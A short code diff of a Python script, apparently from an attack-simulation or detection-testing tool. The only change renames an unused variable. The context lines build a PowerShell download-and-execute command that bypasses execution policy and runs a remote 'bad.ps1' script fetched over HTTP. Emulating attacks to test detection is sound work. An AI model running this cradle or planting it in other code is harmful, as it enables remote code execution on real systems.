@@ -28,7 +28,7 @@ log = logging.getLogger(__name__)
 def main():
     EXE_FILE = _common.get_resource_path("bin/renamed.exe")
 
-    server, ip, port = _common.serve_dir_over_http()
+    _, ip, port = _common.serve_dir_over_http()
     url = "http://{}:{}/bad.ps1".format(ip, port)
 
     cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url)
